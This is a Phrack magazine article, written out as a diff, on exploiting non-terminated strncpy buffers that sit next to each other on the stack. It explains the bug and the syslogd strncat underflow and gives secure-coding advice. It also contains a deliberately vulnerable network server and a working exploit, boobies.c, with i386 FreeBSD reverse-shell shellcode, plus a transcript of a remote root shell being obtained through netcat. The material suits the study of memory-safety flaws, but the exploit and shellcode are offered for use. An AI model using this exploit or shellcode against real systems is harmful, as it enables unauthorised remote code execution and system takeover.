@@ -1,0 +1,889 @@
+                      - P H R A C K   M A G A Z I N E -
+
+                            Volume 0xa Issue 0x38
+                                  05.01.2000
+                                  0x0e[0x10]
+
+|--------- TAKING ADVANTAGE OF NON-TERMINATED ADJACENT MEMORY SPACES ---------|
+|-----------------------------------------------------------------------------|
+|------------------------- twitch <twitch@vicar.org> -------------------------|
+
+
+----|  Introduction
+
+Because Phrack needs another buffer overflow article, because most of those
+pesky strcpy()'s have been replaced with strncpys()'s, and because chicks
+dig shellcode, I present for your benefit yet another buffer overflow
+technique.  Like 'Frame Pointer Overwriting' from P55, this is not the most
+common of problems, but it does exist, and it is exploitable.
+
+This article details the hazards of non-terminated buffers (specifically
+non-terminated strings), and their potential impact on the security of a
+application.  This issue is discussed from a variety potential situations,
+culminating with an example exploit which abuses adjacent non-terminated
+string buffers together to perform program redirection via a buffer overflow.
+Like most bugs this is not an unknown problem, however judging from random
+source browsing, it appears that this is not a widely understood issue.
+
+Incidentally, the example code contains idiosyncratic architectural
+references and man page excerpts as presented from the point of view of
+FreeBSD running on the x86 architecture.
+
+Due to popular pleading, the noun 'data' is treated as singular throughout
+this document, even though that is wrong.
+
+
+----|  Rehash
+
+If you already know how buffer overflows work (and if you have read any
+issue of Phrack within the last two years, how could you not?), skip this
+section.
+
+When a program allocates a buffer, then copies arbitrary data into this
+buffer, it must ensure that there is enough room for everything that is being
+copied.  If there is more data than there is allocated memory, all data could
+still be copied, but past the end of the designated buffer and random, most
+likely quite important, data will be overwritten.  It's all really quite
+rude.  If the data being copied is supplied by the user, the user can do
+malevolent things like change the value of variables, redirect program
+execution, etc.  A common overflow will look like this:
+
+   void func(char *userdata)
+   {
+      char buf[256];
+
+      ...
+
+      strcpy(buf, userdata);
+   
+      ...
+   }
+
+The programmer assumes that the data being copied will surely be less than 256
+bytes and will fit snugly into the supplied buffer.  Unfortunately, since the
+data being copied is user-supplied, it could be damned near anything and of
+any size.  The function strcpy() will continue copying bytes from *userdata
+until a NULL is found, so any data past 256 bytes will overflow.
+
+So, in an effort to keep mean people from abusing their software, programmers
+will make sure that they only copy as much data as there is buffer space.
+To accomplish this task, they will normally do something to this effect:
+
+   void func(char *userdata)
+   {
+      char buf[256];
+
+      ...
+
+      strncpy(buf, userdata, 256);
+   
+      ...
+   }
+
+strncpy() will only copy as many bytes as are specified.  So in the above,
+the maximum amount of data that is ever copied is 256 bytes, and nothing is
+overwritten (note that the above code snippet exemplifies the problem discussed
+below).
+
+For a far superior explanation of buffer overruns, program redirection,
+and smashing the stack for fun and profit, consult the article of the
+same name as the latter in P49-10.
+
+
+----|  Pith
+
+The essence of the issue is that many functions that a programmer may take
+to be safe and/or 'magic bullets' against buffer overflows do not
+automatically terminate strings/buffers with a NULL.  That in actuality,
+the buffer size argument provided to these functions is an absolute size- not
+the size of the string.  To put a finer point on it, an excerpt from the
+strncpy() man page:
+
+   char *
+   strncpy(char *dst, const char *src, size_t len)
+
+   ...
+
+   The strncpy() copies not more than len characters into dst, appending
+   `\0' characters if src is less than len characters long, and _not_+
+   terminating dst if src is more than len characters long.
+
+   ...
+
+   +(underline present in the source)
+
+To understand the ramifications of this, consider the case of two automatic
+character arrays, allocated thusly:
+
+   char buf1[8];
+   char buf2[4];
+
+The compiler is most likely going to place these two buffers _next_ to each
+other on the stack.  Now, consider the stack for the above:
+
+Upper
+Memory   
+  ||     ---------------->  [Top of the stack]
+  ||     ---------------->  [ buf2 - 0 ]
+  ||     ---------------->  [ buf2 - 1 ]
+  ||     ---------------->  [ buf2 - 2 ]
+  ||     ---------------->  [ buf2 - 3 ]
+  ||     ---------------->  [ buf1 - 0 ]
+  ||     ---------------->  [ buf1 - 1 ]
+  ||     ---------------->  [ buf1 - 2 ]
+  ||     ---------------->  [ buf1 - 3 ]
+  ||           ...
+  ||     ---------------->  [ buf1 - 7 ]
+  ||
+  ||           ...
+  \/
+
+   [ Remember that the stack grows down on our example architecture
+     (and probably yours, too), so the above diagram looks upside down ]
+
+Thus, if a programmer were to do the following:
+
+   void
+   func()
+   {
+      char buf1[8];
+      char buf2[4];
+
+      fgets(buf1, 8, stdin);
+      strncpy(buf2, buf1, 4);
+   }
+
+Assuming that the user entered the string 'iceburn', after the strncpy()
+the stack would look like this:
+
+Upper
+Memory   
+  ||     ---------------->  [Top of the stack]
+  ||     ---------------->  [ 'i'  (buf2 - 0) ]
+  ||     ---------------->  [ 'c'  (buf2 - 1) ]
+  ||     ---------------->  [ 'e'  (buf2 - 2) ]
+  ||     ---------------->  [ 'b'  (buf2 - 3) ]
+  ||     ---------------->  [ 'i'  (buf1 - 0) ]
+  ||     ---------------->  [ 'c'  (buf1 - 1) ]
+  ||     ---------------->  [ 'e'  (buf1 - 2) ]
+  ||     ---------------->  [ 'b'  (buf1 - 3) ]
+  ||     ---------------->  [ 'u'  (buf1 - 4) ]
+  ||     ---------------->  [ 'r'  (buf1 - 5) ]
+  ||     ---------------->  [ 'n'  (buf1 - 6) ]
+  ||     ---------------->  [ 0x00 (buf1 - 7) ]
+  ||
+  ||           ...
+  \/
+
+We know from the man page that even though strncpy() is not going to copy
+more than 4 bytes.  But since the src string is longer than 4 bytes, it
+will not null-terminate either.  Thus, strlen(buf2) is now 11, even though
+sizeof(buf2) is 4.  This is not an overflow, as no data beyond the
+boundaries of the allocated space have been overwritten.  However, it does
+establish a peculiar situation.  For instance, the result of
+
+   printf("You entered: %s\n", buf2);
+
+would produce the following:
+
+  You entered: icebiceburn
+
+Not exactly the intent.
+
+
+----|  Apparition
+
+This problem surfaces in the real world in seemingly benign and arcane
+ways. The following is from syslogd.c on FreeBSD 3.2-RELEASE:
+
+   /*
+    * Validate that the remote peer has permission to log to us.
+    */
+   int
+   validate(sin, hname)
+   struct sockaddr_in *sin;
+      const char *hname;
+   {
+      int i;
+      size_t l1, l2;
+      char *cp, name[MAXHOSTNAMELEN];
+      struct allowedpeer *ap;
+
+      if (NumAllowed == 0)
+         /* traditional behaviour, allow everything */
+         return 1;
+
+      strncpy(name, hname, sizeof name);
+      if (strchr(name, '.') == NULL) {
+         strncat(name, ".", sizeof name - strlen(name) - 1);
+         strncat(name, LocalDomain, sizeof name - strlen(name) - 1);
+      }
+
+      ... 
+   }
+
+Suppose that hname is at least MAXHOSTNAMELEN bytes long and does not contain
+a '.'.  This means that the calculation for the length argument to strncat will
+expand to:
+
+   sizeof name == MAXNAMELEN
+   strlen(name) >= MAXNAMELEN
+   Thus, length will be < 0
+
+Well, since the length parameter to strncat is of type size_t, which is
+unsigned, strncat will actually be willing to append _way_ to many bytes.
+Thus, all of LocalDomain will be appended to name (which is already full),
+an overflow will occur and syslogd will seg fault when validate() returns.
+Incidentally, unless LocalDomain for the host is an appropriate offset into
+the stack, this example is exploitable only as a way to kill syslog
+(incidentally, 0xbfbfd001.com is available).
+
+
+----|  Pith + Apparition = Opportunity
+
+Although this type of overflow may be exploited in a variety of manners (and
+indeed, it will manifest itself in a variety of ways), the sexiest and easiest
+to understand is program redirection.  Please note that although the example
+situations presented are exorbitantly contrived, that similar conditions exist
+in sundry software currently in use all over the world.
+
+Now, let us address a situation where the user has control over the contents of
+two adjacent buffers.  Consider the following snippet:
+
+   int
+   main(int argc, char **argv)
+   {
+      char buf1[1024];
+      char buf2[256];
+
+      strncpy(buf, argv[1], 1024);
+      strncpy(buf2, argv[2], 256);
+
+      ...
+
+      if(somecondition)
+         print_error(buf2);
+
+   }
+
+   void print_error(char *p)
+   {
+      char mybuf[263];
+      
+      sprintf(mybuf, "error: %s", p);
+   }
+
+A stack diagram would be really large and redundant, so one will not be making
+an appearance here, but it should be fairly clear what will happen.  The
+programmer assumes that due to the liberal use of strncpy() in main(), that
+the data is clean when it reaches print_error().  Thus, it is assumed that
+sprintf() may be called without incident.  Unfortunately, since p points to
+buf2, and buf2 is not properly terminated, sprintf() will actually continue
+happily copying until it reaches a NULL somewhere after the end of buf1.
+Oh shit.
+
+
+----|  Hexploitation
+
+Exploitation (for the purpose of program redirection) in this scenario is
+slightly different than it is in the case of a traditional single-buffer
+overrun.  First, a little rehash about exploiting traditional buffer overflows.
+
+Assuming that we are overflowing a single buffer of 256 bytes, our payload
+would generally look something like this (diagrams obviously not to
+scale):
+
+  [ 0 ....................................................256.. ~280 ]
+  --------------------------------------------------------------------
+  |                |           |            |                        |
+  | Bunch of NOP's | shellcode | More NOP's | offset_to_shellcode    |
+  |                |           |            |                        |
+  --------------------------------------------------------------------
+  |                            Buffer                      |
+  |________________________________________________________|
+
+All that we do is pass enough data so that when the overflow occurs, the
+offset to the our shellcode (an address somewhere on the stack) overwrites
+the saved instruction pointer.  Thus, when the vulnerable function returns,
+program execution is redirected to our code.
+
+Now assume that we want to overflow another 256-byte buffer, say the one
+in print_error() in the code snippet from the last section.  To accomplish
+our malevolent ends however, we will have to use buf1 and buf2 in tandem.
+All we have to do is fill all of buf2 with our shellcode and NOP's, then
+use the beginning of buf1 for our offset. 
+
+Thus, after the strncpy()'s, buf1 will look like this:
+
+  [ 0 ......................................................... 1024 ]
+  --------------------------------------------------------------------
+  |                     |                                            |
+  | offset_to_shellcode |      Filled with NULL's by strncpy()       | 
+  |                     |                                            |
+  --------------------------------------------------------------------
+
+And buf2 will look like this:
+
+  [ 0 .......................................................... 256 ]
+  --------------------------------------------------------------------
+  |                     |           |                                |
+  | Bunch of NOP's      | shellcode |          More NOP's            |
+  |                     |           |                                |
+  --------------------------------------------------------------------
+
+This arrangement is required due to the way in which the buffers are arranged
+on the stack. What is supplied as argv[1] (the data that is copied into
+buf1) will be located higher in memory than the data we supply as argv[2]
+(which is copied into buf2). So technically, we supply the offset at the
+beginning of the exploit string, rather than at the end. Then, when
+print_error() is called, the stack in main(), will look like this:
+
+  [Top of stack                                          Upper Memory]
+  [ 0 .............................................~300../ /... 1280 ]
+  -------------------------------------------------------/ /----------
+  |                |           |            |            / /         |
+  | Bunch of NOP's | shellcode | More NOP's |   offset   / /  NULL's |
+  |                |           |            |            / /         |
+  -------------------------------------------------------/ /----------
+
+Which resembles greatly the traditional payload described above.
+
+When print_error() is called, it is passed a pointer to the beginning of buf2,
+or, the top of the stack in main().  Thus, when sprintf() is called, an overrun
+occurs, redirecting program execution to our shellcode, and all is lost.
+
+Note that alignment here is key, since if the compiler pads one of the buffers,
+we may run into a problem.  Which buffer is padded and the contents of the
+pad bytes both play a role in the success of exploitation.
+
+If buf2 is padded, and the padded bytes contain NULL's, no overflow (or, at
+least, no usable overflow) will occur.  If the pad bytes are _not_ null, then
+as long as the pad bytes end on a double-word boundary (which they almost
+certainly will), we can still successfully overwrite the saved instruction
+pointer.
+
+If buf1 is padded, whether or not the pad bytes contain NULL's is really of no
+consequence, as they will fall after our shellcode anyway.
+
+
+----|  Denouement
+
+As with all bugs, the fault here is not of the library functions, or of the C
+programming language, or operating systems not marking  data as non-executable,
+but that programmers do not fully realize the ramifications of what they
+are doing.  Before handling any potentially hazardous materials (arbitrary
+data), special precautions should be made.  Man pages should be read.  Buffers
+should be terminated.  Return values should be checked.  All it takes is a
+'+1' and an initialization.  How hard is this:
+
+   char buf[MAXSIZE + 1];
+   FILE *fd;
+   size_t len;
+
+   ...
+
+   memset(buf, 0, MAXSIZE + 1);
+   len = fread((void *)buf, 1, MAXSIZE, fd);
+   /*
+    * This won't actually happen, but it is supplied to
+    * prove a point
+    */
+   if(len > MAXSIZE){      
+      syslog(LOG_WARNING, "Overflow occured in pid %d, invoked by %d\n",
+            getpid(), getuid());
+      exit(1);
+   }
+
+   ...
+
+Okay, so the above is a bit silly, but the hopefully the intent is
+clear.
+
+Incidentally, the following also do not terminate on behalf of lazy
+programmers:
+
+   fread()
+   the read() family [ read(), readv(), pread() ]
+   memcpy()
+   memccpy()
+   memmove()
+   bcopy()
+   for(i = 0; i < MAXSIZE; i++)
+      buf[i] = buf2[i];
+   gethostname()
+   strncat()
+
+These functions are kind enough to null-terminate for you:
+
+   snprintf()
+   fgets()
+
+Now, go break something, or better yet, go fix something.
+
+
+----|  Example
+
+Attached is an example exploit for an example vulnerable program.  The
+vulnerable program is pathetically contrived, and serves no purpose other
+than:
+
+   a) Offering an example of explaining the considerations of 
+      exploiting this type of buffer overrun.
+   b) Offering a viable opportunity to pimp some new shellcode.
+
+The decision not to present an exploit to real software was due to:
+
+   a) The fact that publishing 0-day in Phrack is rude.
+   b) If I didn't report the bugs I've found I would be a prick.
+   c) The fact that any bugs that I have found should already be patched
+      by the time this comes out.
+   d) The presented example is easier to follow than a real-world app.
+   e) The point of this article is to inform, not help you tag
+      www.meaninglessdomain.com.
+
+But hey, you're getting free shellcode, so reading this wasn't an entire
+waste of time.
+
+The exploit itself will throw a shell to any system and port you deem
+necessary.  I think that's useful.  Read the comments in boobies.c for
+instructions on how to use.
+
+The shellcode is i386-FreeBSD specific, so in order to play with this the
+vulnerable proggy will need to be run on an x86 FreeBSD machine.  The exploit
+should compile and run on anything -- though you may have to tweak the
+alignment for your particular architecture.
+
+Incidentally, x86 Linux and SPARC Solaris versions of the shellcode are
+available at www.vicar.org/~twitch/projects/llehs.
+
+
+----|  The code
+
+<++> p56/Boobies/vuln.c !66dd8731
+/*
+ * vuln.c
+ * 
+ * 01/09/1999
+ * <twitch@vicar.org>
+ *
+ * Example to display how non-terminated strings in adjacent memory
+ * spaces may be exploited.
+ *
+ * Give it a port to listen on if you wish as argv[argc - 1]
+ * (the default is 6543). 
+ *
+ * The code is sloppy because I really didn't care. 
+ * Pretend it's a game on a Happy Meal(tm) box- how many other exploitable
+ * conditions can you find?
+ *
+ * to compile-
+ * [twitch@lupus]$ gcc -Wall -o vuln vuln.c
+ */
+
+#include <stdio.h>
+#include <string.h>
+#include <unistd.h>
+#include <stdlib.h>
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <netinet/in.h>
+#include <arpa/inet.h>
+#include <netdb.h>
+
+#ifndef MAXHOSTNAMELEN
+#define MAXHOSTNAMELEN   256
+#endif /* MAXHOSTNAME */
+
+#define PORT   6543
+
+int be_vulnerable(int);
+void oopsy(char *);
+int do_stuff(char *, int, u_short);
+
+int
+main(int argc, char **argv)
+{
+   char myname[MAXHOSTNAMELEN + 1];
+   struct hostent *h;
+   int r;
+   u_short port;
+
+   port = PORT;
+
+   if(argc > 1)
+      port = strtoul(argv[argc - 1], NULL, 10);
+
+   memset(myname, 0, MAXHOSTNAMELEN + 1);
+   r = gethostname(myname, MAXHOSTNAMELEN);
+   if(r){
+      perror("gethostname");
+      return(1);
+   }
+
+   if(!(strlen(myname))){
+      fprintf(stderr, "I have no idea what my name is, bailing\n");
+      return(1);
+   }
+   
+   h = gethostbyname(myname);
+   if(!h){
+      fprintf(stderr, "I couldn't resolve my own name, bailing\n");
+      return(1);
+   }
+
+   return(do_stuff(h->h_addr, h->h_length, port));
+}
+
+/*
+ * do_stuff()
+ *    Listen on a socket and when we get a connection, had it
+ *    off to be_vulnerable().
+ */
+int
+do_stuff(char *myaddr, int addrlen, u_short port)
+{
+   struct sockaddr_in sin, fin;
+   int s, r, alen;
+   char *p;
+   memcpy(&sin.sin_addr.s_addr, myaddr, addrlen); 
+   
+   p = inet_ntoa(sin.sin_addr);
+
+   if(sin.sin_addr.s_addr == -1L){
+      fprintf(stderr, "inet_addr returned the broadcast, bailing\n");
+      return(1);
+   }
+
+   memset(&sin, 0, sizeof(struct sockaddr));
+   sin.sin_family = AF_INET;
+   sin.sin_port = htons(port);
+
+   s = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
+   if(s < 0){
+      perror("socket");
+      return(1);
+   }
+
+   alen = sizeof(struct sockaddr);
+   r = bind(s, (struct sockaddr *)&sin, alen);
+   if(r < 0){
+      perror("bind");
+      return(1);
+   }
+
+   r = listen(s, 1);
+   if(r < 0){
+      perror("listen");
+      return(1);
+   }
+
+   printf("Accepting connections on port %d...\n", port);
+
+   memset(&fin, 0, alen);
+   r = accept(s, (struct sockaddr *)&fin, &alen);
+   if(r < 0){
+      perror("accept");
+      return(1);
+   }
+
+   return(be_vulnerable(r));
+}
+
+/*
+ * be_vulnerable()
+ *    We grab a chunk o' data from the wire and deal with it
+ *    in an irresponsible manner.
+ */
+int
+be_vulnerable(int s)
+{
+   int r;
+   char buf[1024], buf2[256];
+
+   memset(buf, 0, 1024);
+   memset(buf2, 0, 256);
+   r = read(s, (void *)buf, 1024);
+   r = read(s, (void *)buf2, 256);
+
+   oopsy(buf2);
+
+   close(s);
+   return(0);
+}
+
+/*
+ * oopsy()
+ *    Copy data into local storage to do something with it.
+ *    I'm lazy so all this does is cause the overflow.
+ */
+void
+oopsy(char *p)
+{
+   char mybuf[256];
+
+   fprintf(stderr, "Oh shit, p is %d bytes long.\n", strlen(p));
+   strncpy(mybuf, p, strlen(p));
+}
+<-->
+<++> p56/Boobies/boobies.c !f264004c
+/*
+ * boobies.c
+ *
+ * 01/09/1999
+ * <twitch@vicar.org>
+ *
+ * Dedicated to Kool Keith, Bushmill's smooth and mellow (distilled
+ * three times) Irish Whiskey, and that one SCO guy's beautiful lady.
+ *
+ *
+ * Example exploit for vuln.c to display how non-terminated strings
+ * in adjacent memory can cause real troubles.
+ *
+ * This shellcode will establish a TCP connection to any port and
+ * address you deem fit (see the shellcode for where/how to do this)
+ * and drop a shell. You won't get a prompt, but otherwise, it is a
+ * full shell with the privleges of whatever the exploited program had.
+ *
+ * This is the x86 FreeBSD version- Linux and SPARC Solaris versions,
+ * as well as full assembly listings are available at
+ * www.vicar.org/~twitch/projects/llehs
+ *
+ * To use this exploit, run the silly little vulnerability demo
+ * program on some system (in this example it's running on a system
+ * called lupus) thusly:
+ *
+ * [twitch@lupus]$ ./vuln
+ * Accepting connections on port 6543...
+ *
+ * Then do this on the attacking system (or wherever you are directing
+ * the shell):
+ *
+ * [twitch@pornstar]$ nc -n -v -l -p 1234
+ * listening on [any] 1234 ...
+ *
+ *    [ from another terminal/window ]
+ *
+ * [twitch@pornstar]$ ./boobies -a 192.168.1.1 -p 1234 |nc -v lupus 6543
+ * lupus [192.168.1.6] 6543 (?) open
+ *
+ *    [ back to the first terminal/window ]
+ *
+ * connect to [192.168.1.1] from (lupus) [192.168.1.6] 1234
+ * uname -n
+ * lupus.vicar.org
+ * ls -alF /root/
+ * total 14
+ * drwxr-x---   3 root  wheel   512 Dec  8 20:44 ./
+ * drwxr-xr-x  19 root  wheel   512 Dec 10 19:13 ../
+ * -rw-------   1 root  wheel  4830 Jan  4 16:15 .bash_history
+ * -rw-------   2 root  wheel   383 May 17  1999 .cshrc
+ * -rw-------   1 root  wheel  1354 Jan  5 10:33 .history
+ * -rw-------   1 root  wheel   124 May 17  1999 .klogin
+ * -rw-------   1 root  wheel   491 Dec  4 19:59 .login
+ * -rw-------   2 root  wheel   235 May 17  1999 .profile
+ * drwxr-x---   2 root  wheel   512 Dec  8 20:44 .ssh/
+ * ^C
+ * [twitch@pornstar]$
+ *
+ * You will need to supply an offset of around -50 if
+ * vuln is running on a port besides the default.
+ *
+ * The exploit has a few options that you can read about by doing:
+ * [twitch@pornstar]$ ./boobies -h
+ * usage: ./boobies [-o offset_nudge] [-p port] [-a address] [-A alignment]
+ *    -o              Nudge the offset offset_nudge bytes.
+ *    -p              Port to which the target should connect.
+ *    -a              Address to which the target should connect.
+ *                    (Must be an IP address because I'm lazy.)
+ *    -A              Nudge the alignment.
+ *    -v              Be verbose about what we're doing.
+ *    -h              The secret to life.
+ *
+ * If you compile this on non-x86 architectures, you will prolly have to
+ * play with the alignment a bit.
+ *
+ * to compile-
+ * [twitch@pornstar]$ gcc -o boobies -Wall boobies.c
+ * Be alert, look alive, and act like you know.
+ */
+
+#include <stdio.h>
+#include <unistd.h>
+#include <stdlib.h>
+#include <string.h>
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <netinet/in.h>
+#include <arpa/inet.h>
+
+char llehs[] =
+   "\x55\x89\xe5\xeb\x7e\x5e\x31\xc0\x88\x46\x07\x83\xec\x18"  /* 14 */
+   "\xc6\x45\xe9\x02\x31\xc0\x66\xb8"                          /* 22 */
+
+   /*
+    * Replace with (htons(port) ^ 0xff).
+    * Defaults to 1234.
+    */
+   "\xfb\x2d"
+
+   "\x66\x35\xff\xff\x66\x89\x45\xea\xb8"                      /* 33 */
+
+   /*
+    * Replace with (inet_addr(host_to_conenct_to) ^ 0xffffffff).
+    * Defaults to 192.168.1.6.
+    */
+   "\x3f\x57\xfe\xf9"
+
+   "\x83\xf0\xff\x89\x45\xec\x6a\x06\x6a\x01\x6a\x02\x6a\x0f\x31\xc0\xb0"
+   "\x61\xcd\x80"
+
+   "\x6a\x10\x89\xc3\x8d\x45\xe8\x50\x53\x6a\x0f\x31\xc0\xb0\x62\xcd\x80"
+   "\x31\xc0\x50\x53\x6a\x0f\xb0\x5a\xcd\x80"
+   "\x53\x6a\x0f\x31\xc0\xb0\x06\xcd\x80"
+   "\x6a\x01\x31\xc0\x50\x6a\x0f\xb0\x5a\xcd\x80"
+   "\x6a\x02\x31\xc0\x50\x6a\x0f\xb0\x5a\xcd\x80"
+   "\x31\xc0\x50\x50\x56\x6a\x0f\xb0\x3b\xcd\x80"
+   "\x31\xc0\x40\xcd\x80"
+   "\xe8\x7d\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68";
+
+/*
+ * This offset seems to work if you are running the exploit and the
+ * vulnerable proggy on the same machine, with vuln listening on its
+ * default port. If vuln is listening on a user-supplied port, this
+ * needs to be around 0xbfbfd0fc.  YMMV.
+ */
+#define OFFSET    0xbfbfd108
+#define NOP       0x90
+#define BUFSIZE   1300
+#define SHELLSIZE 143
+#define PAD       32
+#define ALIGNIT   0
+
+/*
+ * Offset into the shellcode for the port
+ */
+#define SCPORTOFF 22
+
+/*
+ * Offset into the shellcode for the address
+ */
+#define SCADDROFF 33
+
+void
+usage(char *proggy)
+{
+   fprintf(stderr, "usage: %s [-o offset_nudge] [-p port] [-a address] ",
+         proggy);
+   fprintf(stderr, "[-A alignment]\n");
+   fprintf(stderr, "\t-o\t\tNudge the offset offset_nudge bytes.\n");
+   fprintf(stderr, "\t-p\t\tPort to which the target should connect.\n");
+   fprintf(stderr, "\t-a\t\tAddress to which the target should connect.\n");
+   fprintf(stderr, "\t\t\t(Must be an IP address because I'm lazy.)\n");
+   fprintf(stderr, "\t-A\t\tNudge the alignment.\n");
+   fprintf(stderr, "\t-v\t\tBe verbose about what we're doing.\n");
+   fprintf(stderr, "\t-h\t\tThe secret to life.\n");
+   fprintf(stderr, "\n");
+
+   exit(1);
+}
+
+void
+main(int argc, char **argv)
+{
+   char b00m[BUFSIZE], *p, c;
+   char *port, *addr;
+   u_short portd;
+   u_long addrd;
+   extern char *optarg;
+   int i, nudge = 0, o = OFFSET, align = 0;
+   int verb = 0;
+
+   port = &(llehs[SCPORTOFF]);
+   addr = &(llehs[SCADDROFF]);
+   while((c = getopt(argc, argv, "o:p:a:A:vh")) != -1){
+      switch(c){
+         /*
+          * Nudge to the offset
+          */
+         case 'o':
+            nudge = strtoul(optarg, NULL, 10);
+            break;
+         /*
+          * Port to which we connect
+          */
+         case 'p':
+            portd = strtoul(optarg, NULL, 10);
+
+            if(verb)
+               fprintf(stderr, "Shell coming back on port %d\n", portd);
+
+            portd = htons(portd);
+            portd ^= 0xffff;
+
+            if(verb)
+               fprintf(stderr, " (0x%x)\n", portd);
+
+            memcpy((void *)port, (void *)&portd, sizeof(u_short));
+            break;
+         /*
+          * Address to which we connect
+          */
+         case 'a':
+            addrd = inet_addr(optarg);
+            if(addrd == -1L){
+               fprintf(stderr, "Bad address '%s'.\n", optarg);
+               exit(1);
+            }
+            addrd ^= 0xffffffff;
+            memcpy((void *)addr, (void *)&addrd, sizeof(u_long));
+
+            if(verb){
+               fprintf(stderr, "Shell is being sent to %s.\n", optarg);
+               fprintf(stderr, " (0x%lx)\n", addrd);
+            }
+
+            break;
+         /*
+          * Alignment (should only be necessary on architectures
+          * other than x86)
+          */
+         case 'A':
+            align = strtoul(optarg, NULL, 10);
+            break;
+         case 'v':
+            verb++;
+            break;
+         case 'h':
+         default:
+            usage(argv[0]);
+            break;
+         }
+   }
+
+   o += nudge;
+   align += ALIGNIT;
+
+   if(verb){
+      fprintf(stderr, "Offset is 0x%x\n", o);
+      fprintf(stderr, "Alignment nudged %d bytes\n", align);
+   }
+
+   p = b00m;
+   memset(p, 0x90, sizeof(b00m)); 
+   p = b00m + ALIGNIT;
+   for(i = 0; i < PAD; (i += 4)){
+      *((int *)p) = o;
+      p +=4;
+   }
+
+   p = (&b00m[0]) + PAD + PAD + ALIGNIT;
+   memcpy((void *)p, (void*)llehs, SHELLSIZE);
+
+   b00m[BUFSIZE] = 0;
+   fprintf(stderr, "payload is %d bytes wide\n", strlen(b00m));
+   printf("%s", b00m);
+   exit(0);
+}
+<-->
+
+|EOF|-------------------------------------------------------------------------|
